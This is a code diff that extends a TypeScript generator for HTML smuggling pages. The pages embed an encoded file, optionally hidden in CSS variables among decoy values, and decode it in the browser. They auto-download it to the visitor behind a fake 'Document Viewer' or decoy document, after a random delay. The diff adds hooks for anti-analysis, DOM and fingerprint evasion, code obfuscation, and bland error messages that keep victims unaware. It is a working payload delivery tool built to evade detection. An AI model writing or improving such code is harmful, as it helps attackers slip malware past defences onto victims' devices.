@@ -10,6 +10,16 @@ import {
   hexDecode, 
   generateRandomKey 
 } from "./encoders";
+import {
+  generateAntiAnalysisCode,
+  generateRandomDelay,
+  generateFakeContent,
+  generateStorageCode,
+  generateDOMEvasion,
+  generateFingerprintEvasion,
+  obfuscateString,
+  obfuscateVariableName
+} from "./stealthUtils";
 
 export async function generatePayload(fileData: FileData, config: Config): Promise<string> {
   const { file, content } = fileData;
@@ -57,7 +67,12 @@ export async function generatePayload(fileData: FileData, config: Config): Promi
     mimeType: file.type || 'application/octet-stream',
     autoDownload: config.autoDownload,
     stealthMode: config.stealthMode,
-    method: config.method
+    method: config.method,
+    fakeContent: config.fakeContent,
+    obfuscateCode: config.obfuscateCode,
+    randomDelay: config.randomDelay,
+    storageMethod: config.storageMethod,
+    antiAnalysis: config.antiAnalysis
   });
   
   return html;
@@ -71,95 +86,208 @@ interface TemplateParams {
   autoDownload: boolean;
   stealthMode: boolean;
   method: string;
+  fakeContent: boolean;
+  obfuscateCode: boolean;
+  randomDelay: boolean;
+  storageMethod: string;
+  antiAnalysis: boolean;
 }
 
 function generateHTMLTemplate(params: TemplateParams): string {
-  const { encodedData, decoderFunction, fileName, mimeType, autoDownload, stealthMode, method } = params;
+  const { 
+    encodedData, 
+    decoderFunction, 
+    fileName, 
+    mimeType, 
+    autoDownload, 
+    stealthMode, 
+    method,
+    fakeContent,
+    obfuscateCode,
+    randomDelay,
+    storageMethod,
+    antiAnalysis
+  } = params;
   
-  const cssPayload = stealthMode ? `
+  // Generate fake content if enabled
+  const fakeDoc = fakeContent ? generateFakeContent() : null;
+  
+  // Generate storage code based on method
+  const storageCode = generateStorageCode(storageMethod, encodedData, obfuscateVariableName('key'));
+  
+  // Generate stealth features
+  const antiAnalysisFeatures = antiAnalysis ? generateAntiAnalysisCode() : '';
+  const delayCode = randomDelay ? generateRandomDelay() : '';
+  const domEvasion = obfuscateCode ? generateDOMEvasion() : '';
+  const fingerprintEvasion = obfuscateCode ? generateFingerprintEvasion() : '';
+  
+  // Generate CSS with optional payload hiding
+  const cssPayload = `
     <style>
+      ${stealthMode && storageMethod === 'css' ? `
       :root {
         --payload-data: '${encodedData}';
         --payload-name: '${fileName}';
         --payload-type: '${mimeType}';
+        --decoy-1: 'user-tracking-data-${Math.random().toString(36)}';
+        --decoy-2: 'analytics-config-${Math.random().toString(36)}';
+      }` : ''}
+      body { 
+        margin: 0; 
+        padding: 20px; 
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        line-height: 1.6;
+        color: #333;
+        background: #fff;
       }
-      body { margin: 0; padding: 20px; font-family: Arial, sans-serif; }
-      .container { max-width: 600px; margin: 0 auto; text-align: center; }
-      .loading { margin: 20px 0; }
-    </style>` : `
-    <style>
-      body { margin: 0; padding: 20px; font-family: Arial, sans-serif; }
-      .container { max-width: 600px; margin: 0 auto; text-align: center; }
-      .loading { margin: 20px 0; }
-    </style>`;
+      .container { 
+        max-width: 800px; 
+        margin: 0 auto; 
+      }
+      .loading { 
+        text-align: center;
+        margin: 40px 0; 
+        color: #666;
+      }
+      .spinner {
+        border: 3px solid #f3f3f3;
+        border-top: 3px solid #3498db;
+        border-radius: 50%;
+        width: 30px;
+        height: 30px;
+        animation: spin 1s linear infinite;
+        margin: 20px auto;
+      }
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+      h1, h2, h3 { color: #2c3e50; }
+      ul, ol { padding-left: 20px; }
+      table { border-collapse: collapse; width: 100%; margin: 20px 0; }
+      th, td { text-align: left; padding: 8px; }
+      .download-btn {
+        display: inline-block;
+        padding: 12px 24px;
+        background: #3498db;
+        color: white;
+        text-decoration: none;
+        border-radius: 6px;
+        margin: 20px 0;
+        font-weight: 500;
+        transition: background 0.3s;
+      }
+      .download-btn:hover {
+        background: #2980b9;
+      }
+    </style>
+  `;
 
-  const payloadStorage = stealthMode 
-    ? "const payloadData = getComputedStyle(document.documentElement).getPropertyValue('--payload-data').trim().slice(1, -1);"
-    : `const payloadData = '${encodedData}';`;
+  // Generate main content
+  const mainContent = fakeDoc ? fakeDoc.content : `
+    <div class="container">
+      <div class="loading">
+        <div class="spinner"></div>
+        <h2>Loading Document...</h2>
+        <p>Please wait while the document is being prepared for download.</p>
+      </div>
+    </div>
+  `;
+
+  // Generate the payload extraction script
+  const payloadScript = `
+    <script>
+      ${antiAnalysisFeatures}
+      ${domEvasion}
+      ${fingerprintEvasion}
+      
+      // Main payload function
+      (async function() {
+        try {
+          ${delayCode}
+          
+          // Get payload data
+          ${storageMethod === 'css' && stealthMode 
+            ? "const payloadData = getComputedStyle(document.documentElement).getPropertyValue('--payload-data').trim().slice(1, -1);"
+            : storageCode.includes('payloadData') 
+              ? storageCode 
+              : `const payloadData = '${encodedData}';`
+          }
+          
+          if (!payloadData) {
+            throw new Error('Resource not available');
+          }
+
+          ${decoderFunction}
+
+          const decodedData = decodePayload(payloadData);
+          const blob = new Blob([decodedData], { type: '${mimeType}' });
+          const url = URL.createObjectURL(blob);
+          
+          ${autoDownload ? `
+          // Auto-download with delay
+          setTimeout(() => {
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = '${fileName}';
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            
+            ${fakeDoc ? `
+            document.querySelector('.container').innerHTML += '<div style="margin-top: 30px; padding: 15px; background: #e8f5e8; border-left: 4px solid #27ae60; color: #27ae60;"><strong>✓ Download Complete</strong><br>The requested document has been downloaded to your device.</div>';
+            ` : `
+            document.querySelector('.container').innerHTML = '<div style="text-align: center; margin-top: 50px;"><h2>✓ Download Complete</h2><p>Your file has been downloaded successfully.</p></div>';
+            `}
+          }, Math.random() * 2000 + 1000);
+          ` : `
+          // Manual download
+          const downloadBtn = document.createElement('a');
+          downloadBtn.href = url;
+          downloadBtn.download = '${fileName}';
+          downloadBtn.className = 'download-btn';
+          downloadBtn.textContent = '📄 Download ${fileName}';
+          
+          ${fakeDoc ? `
+          document.querySelector('.container').innerHTML += '<div style="margin-top: 30px; text-align: center;"><p><strong>Document Ready for Download:</strong></p></div>';
+          document.querySelector('.container').appendChild(downloadBtn);
+          ` : `
+          document.querySelector('.container').innerHTML = '<div style="text-align: center;"><h2>Document Ready</h2><p>Click below to download your file:</p></div>';
+          document.querySelector('.container').appendChild(downloadBtn);
+          `}
+          `}
+          
+          // Cleanup
+          setTimeout(() => {
+            URL.revokeObjectURL(url);
+          }, 30000);
+          
+        } catch (error) {
+          console.warn('Document processing issue:', error.message);
+          ${fakeDoc ? `
+          document.querySelector('.container').innerHTML += '<div style="margin-top: 30px; padding: 15px; background: #ffeaa7; border-left: 4px solid #fdcb6e; color: #e17055;"><strong>⚠ Notice</strong><br>The document attachment could not be processed. Please contact the sender for an alternative format.</div>';
+          ` : `
+          document.querySelector('.container').innerHTML = '<div style="text-align: center; margin-top: 50px; color: #e74c3c;"><h2>⚠ Document Unavailable</h2><p>The requested document could not be loaded at this time.</p></div>';
+          `}
+        }
+      })();
+    </script>
+  `;
 
   return `<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document Viewer</title>
+    <title>${fakeDoc ? fakeDoc.title : 'Document Viewer'}</title>
+    <meta name="description" content="${fakeDoc ? 'Important document for review and download' : 'Document viewer and download portal'}">
+    <meta name="robots" content="noindex, nofollow">
     ${cssPayload}
 </head>
 <body>
-    <div class="container">
-        <h2>Loading Document...</h2>
-        <div class="loading">
-            <p>Please wait while the document is being prepared.</p>
-        </div>
-    </div>
-
-    <script>
-        // Payload extraction and download
-        (function() {
-            try {
-                ${payloadStorage}
-                
-                if (!payloadData) {
-                    throw new Error('No payload data found');
-                }
-
-                ${decoderFunction}
-
-                const decodedData = decodePayload(payloadData);
-                const blob = new Blob([decodedData], { type: '${mimeType}' });
-                const url = URL.createObjectURL(blob);
-                
-                ${autoDownload ? `
-                // Auto-download
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = '${fileName}';
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-                
-                document.querySelector('.container').innerHTML = '<h2>Download Started</h2><p>Your file should begin downloading automatically.</p>';
-                ` : `
-                // Manual download
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = '${fileName}';
-                a.textContent = 'Click to Download ${fileName}';
-                a.style.cssText = 'display: inline-block; padding: 10px 20px; background: #007bff; color: white; text-decoration: none; border-radius: 5px; margin: 20px 0;';
-                
-                document.querySelector('.container').innerHTML = '<h2>Document Ready</h2>';
-                document.querySelector('.container').appendChild(a);
-                `}
-                
-                // Cleanup URL after a delay
-                setTimeout(() => URL.revokeObjectURL(url), 10000);
-                
-            } catch (error) {
-                console.error('Payload extraction failed:', error);
-                document.querySelector('.container').innerHTML = '<h2>Error</h2><p>Failed to load document.</p>';
-            }
-        })();
-    </script>
+    ${mainContent}
+    ${payloadScript}
 </body>
 </html>`;
 }
